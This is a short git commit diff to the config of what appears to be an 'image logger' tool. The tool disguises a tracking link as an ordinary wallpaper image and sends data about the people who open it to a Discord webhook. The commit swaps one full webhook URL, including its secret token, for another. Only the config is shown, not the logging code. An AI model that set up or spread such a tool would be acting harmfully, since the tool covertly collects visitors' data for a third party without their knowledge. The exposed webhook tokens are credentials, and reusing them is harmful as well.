785aa27693ed5484d9966267325e807071ac10dc
nesquikdrinker <58479655+nesquikdrinker@users.noreply.github.com>
2025-08-05 21:33:45 -0600

    Update image.py

--- api/image.py
+++ api/image.py
@@ -11,7 +11,7 @@ __author__ = "nsqk"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1397270338152304672/0Tv0wcqjiEDDYZpnYL-nufOFNa74kxX5chRwd0nW-c79XTfFpkMGNDSDyAwNb7e0zyYp",
+    "webhook": "https://discord.com/api/webhooks/1383653861092491366/2dbYjKTr2WoEorNFG5qbpd6NvQlR3o12GOAdVqmAlXBmzEzcOLre9jaoEErMhOj33pvF",
     "image": "https://wallpaperaccess.com/full/2060551.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
